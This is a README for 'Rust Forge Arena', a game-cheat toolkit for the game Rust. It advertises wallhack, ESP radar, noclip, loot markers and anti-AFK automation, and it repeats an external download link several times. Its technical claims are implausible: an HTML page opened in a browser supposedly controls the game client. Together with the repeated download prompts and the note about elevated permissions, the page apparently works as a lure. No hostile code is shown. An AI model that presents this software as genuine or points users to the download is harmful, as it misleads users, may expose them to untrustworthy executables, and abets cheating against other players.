# Rust Forge Arena v2026 – Gameplay Enhancement Suite

> **A modular toolkit for improving movement, spatial awareness, and automation in Rust.** Delivers intelligent navigation, environmental overlays, and customizable helpers designed for Windows.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/rossoliver25/rust-forge-toolkit-win?style=flat-square)](https://github.com/rossoliver25/rust-forge-toolkit-win)

---

<p align="center">
  <a href="https://rossoliver25.github.io/rust-forge-toolkit-win/">
    <img src="https://img.shields.io/badge/Download-Rust%20Forge%20Arena-brightgreen?style=for-the-badge" alt="Download Rust Forge Arena">
  </a>
</p>

> **[Direct Download – Rust Forge Arena](https://rossoliver25.github.io/rust-forge-toolkit-win/)**

---

[Download Latest Build](https://rossoliver25.github.io/rust-forge-toolkit-win/)

---

## Overview

Rust Forge Arena is a modular enhancement suite built for the survival title Rust. It provides movement intelligence and environmental visualization tools to help players navigate and stay aware during matches. The 2026 edition refines the anti-AFK research module and introduces AI integration for more adaptive behavior.

The toolkit runs as a lightweight HTML-based interface that communicates with the game client. It features a move generator for automated navigation patterns, configurable visual overlays, and a multilingual interface that adjusts to user preferences. All modules target the standard Windows version of Rust.

---

## Key Capabilities

- **Movement Intelligence Suite:** Adjustable movement patterns with auto-navigation and noclip support  
- **Environmental Visualization Tools:** ESP radar and wallhack overlays for better spatial orientation  
- **Anti-AFK Research Module:** Automated idle prevention using randomized interaction sequences  
- **AI Integration Support:** Connect external AI modules for advanced decision-making  
- **Responsive UI & Language Options:** Multi-language display with adaptive layout for various screen sizes  
- **Treasure Locator System:** Visual markers for in-game loot and resource positions  
- **Configurable Hotkey System:** Custom key bindings for all major functions  
- **Modular Design:** Enable or disable individual components independently  

---

## Getting Started

1. Download the latest build from the link above  
2. Extract the archive into a folder of your choice  
3. Open the `index.html` file in a modern web browser  
4. Launch Rust and run it in windowed or borderless window mode  
5. Use the overlay interface to configure and activate the modules you need  

Minimal example for loading the script via browser console:
```javascript
// Load the main script after the page opens
const script = document.createElement('script');
script.src = 'forge-arena.js';
document.head.appendChild(script);
```

---

## Configuration Options

| Setting | Default | Description |
|---------|---------|-------------|
| Movement Speed | 1.0 | Multiplier for movement speed values |
| ESP Range | 200m | Maximum distance for visual overlays |
| Anti-AFK Interval | 120s | Time between idle prevention actions |
| Language | English | Interface language selection |
| Hotkey Toggle | F1 | Key to enable or disable active modules |
| AI Module | Disabled | External AI integration toggle |

---

## Compatibility

- **Platform:** Windows 10/11 (64-bit)  
- **Game Version:** Rust 2026 stable branch  
- **Browser:** Chrome 120+, Edge 120+, Firefox 120+  
- **Known Limitations:** May not work correctly in fullscreen exclusive mode. Some features require elevated permissions for overlay rendering. Not tested with third-party anti-cheat modifications.  

---

## Frequently Asked Questions

**How do I update the script?**  
Download the newest version from the release page and replace the existing files in your installation folder.

**Can I customize the hotkeys?**  
Yes, all hotkeys can be remapped through the Options panel in the interface.

**Will this work on Linux or macOS?**  
No, the toolkit is designed exclusively for Windows due to game client compatibility.

**How do I disable specific features?**  
Use the module toggle switches in the main interface to enable or disable individual components.

**Where are configuration files stored?**  
Settings are saved in the browser's local storage. Clearing browser data will reset all configurations.

---

## License

GNU GPL v3.0 – see [LICENSE](LICENSE) for details.
